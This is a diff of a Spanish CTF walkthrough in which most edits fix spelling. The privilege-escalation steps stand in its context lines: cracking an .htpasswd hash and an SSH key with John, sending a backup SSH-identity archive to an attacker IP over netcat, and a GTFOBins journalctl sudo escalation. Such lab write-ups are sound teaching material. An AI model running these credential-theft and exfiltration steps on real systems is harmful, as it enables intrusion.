@@ -1,4 +1,4 @@
-## Privilege Escalation {-}
+## Escalada de privilegios {-}
 
 ### Enumeracion del usuario en la maquina victima {-}
 
@@ -31,7 +31,7 @@ cat nhttpd.conf
 cat /var/nostromo/conf/.htpasswd
 ```
 
-Encontramos el hash del usuario david vamos a copiarlo en la maquina de attackante, y intentamos bruteforcear con **John**
+Encontramos el hash del usuario david vamos a copiarlo en la maquina de atacante, y intentamos bruteforcear con **John**
 
 ### John {-}
 
@@ -39,16 +39,16 @@ Encontramos el hash del usuario david vamos a copiarlo en la maquina de attackan
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-Encontramos una contraseña intentamos ponerla aciendo un `su david` y `su root`, pero no va. La conclusion a la que hay que llegar
+Encontramos una contraseña intentamos ponerla haciendo un `su david` y `su root`, pero no va. La conclusion a la que hay que llegar
 es que cuando miras el fichero nhttpd.conf, dice que hay un directorio **public_www**.
 
 
 ### Investigacion del public_www {-}
 
-Intentamos ver si esta en el directorio `/home/david/public_www` y effectivamente. hay un fichero comprimido y nos vamos a transferir 
-a nuestro equipo de attaquante.
+Intentamos ver si esta en el directorio `/home/david/public_www` y efectivamente. hay un fichero comprimido y nos vamos a transferir 
+a nuestro equipo de atacante.
 
-1. En el equipo de attaquante
+1. En el equipo de atacante
 
     ```bash
     nc -nlvp 443 > comprimido.tgz
@@ -60,7 +60,7 @@ a nuestro equipo de attaquante.
     nc 10.10.14.20 443 < backup-ssh-identity-files.tgz
     ```
 
-Descomprimimos el archivo con el commando
+Descomprimimos el archivo con el comando
 
 ```bash
 7z l comprimido.tgz
@@ -78,7 +78,7 @@ ssh2john.py id_rsa > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-La contraseña de la id_rsa a sido crackeada y ya nos podemos connectar con ssh
+La contraseña de la id_rsa a sido crackeada y ya nos podemos conectar con ssh
 
 ```bash
 ssh -i id_rsa david@10.10.10.165 
@@ -95,7 +95,7 @@ cd bin/
 cat server-stats.sh
 ```
 
-Vemos en este fichero que sudo puede executar **journalctl**
+Vemos en este fichero que sudo puede ejecutar **journalctl**
 
 Vamos a la pagina de [gtfobins](gtfobins.github.io) y buscamos por jounalctl
 
